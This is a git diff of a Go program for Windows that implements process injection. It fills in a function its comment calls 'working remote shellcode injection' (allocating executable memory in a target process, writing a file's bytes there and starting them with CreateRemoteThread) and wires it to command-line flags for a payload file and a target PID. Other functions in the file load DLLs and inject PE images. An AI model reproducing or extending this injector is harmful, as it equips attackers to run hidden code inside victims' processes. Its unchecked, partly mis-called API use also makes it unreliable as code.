@@ -49,10 +49,7 @@ var (
 	waitForSingleObject, _ = syscall.GetProcAddress(kernel32, "WaitForSingleObject")
 
 	/*
-		WaitForSingleObject
 		VirtualFree
-
-
 	*/
 )
 
@@ -221,8 +218,28 @@ func LoadDLL(pDll string) {
 	}
 }
 
+//working remote shellcode injection!
 func InjectShellcode(shellcode []byte, dwProcessID int) {
-	fmt.Println("todo")
+	//todo: add more granular checks for success after each function call; figure out why createremotethread does not exit gracefully
+
+	var hProc uintptr
+	//var hRemoteThread uintptr
+	var pRemoteBuff uintptr
+	//var pLoadLibraryAddr uintptr
+
+	hProc = OpenProcess(CREATE_THREAD_ACCESS, 0, uintptr(dwProcessID))
+
+	//allocate space in target
+	pRemoteBuff = VirtualAllocEx(hProc, 0, len(shellcode), MEM_PERMISSIONS, PAGE_EXECUTE_READWRITE, 0)
+
+	//write DLL to allocated memory
+	_ = WriteProcessMemory(hProc, pRemoteBuff, uintptr(unsafe.Pointer(&shellcode[0])), len(shellcode), 0, 0)
+
+	//execute with createremotethreadex
+	_ = CreateRemoteThread(hProc, 0, 0, pRemoteBuff, 0, 0)
+
+	//close handle to target proc
+	_ = CloseHandle(hProc, 0, 0)
 }
 
 // working local shellcode injection!
@@ -244,13 +261,16 @@ func InjectPE(pPE string, dwProcessID int) {
 func main() {
 	defer syscall.FreeLibrary(kernel32)
 
+	//rethink argument parsing - need conditional branching + help with OS path for args?
+
 	dll := flag.String("dll", "test", "path to dll for injection")
 	pid := flag.Int("pid", 0, "Process ID to inject into")
 	flag.Parse()
 	fmt.Println(pid)
 
 	data, _ := ioutil.ReadFile(*dll)
-	ExecuteShellcode(data)
+	InjectShellcode(data, *pid)
+	//ExecuteShellcode(data)
 	//LoadDLL(*dll)
 	//InjectDLL(*dll, *pid)
 
